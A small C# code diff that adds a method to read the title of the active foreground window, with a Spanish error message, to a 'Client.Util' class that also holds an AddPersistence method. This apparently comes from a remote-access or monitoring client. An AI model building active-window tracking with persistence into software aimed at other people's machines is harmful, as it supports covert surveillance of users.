@@ -96,8 +96,20 @@ namespace Client.Util
             }
         }
 
-       
 
+        public static string getWindowsActiveTitle()
+        {
+
+            StringBuilder windowTitle = new StringBuilder(256);
+            IntPtr handle = GetForegroundWindow();
+
+            if (GetWindowText(handle, windowTitle, windowTitle.Capacity) > 0) { return windowTitle.ToString(); }
+            else { return "No se ha podido obtener el nombre de la ventana activa"; }
+
+
+
+        }
+       
         public static void AddPersistence()
         {
             try
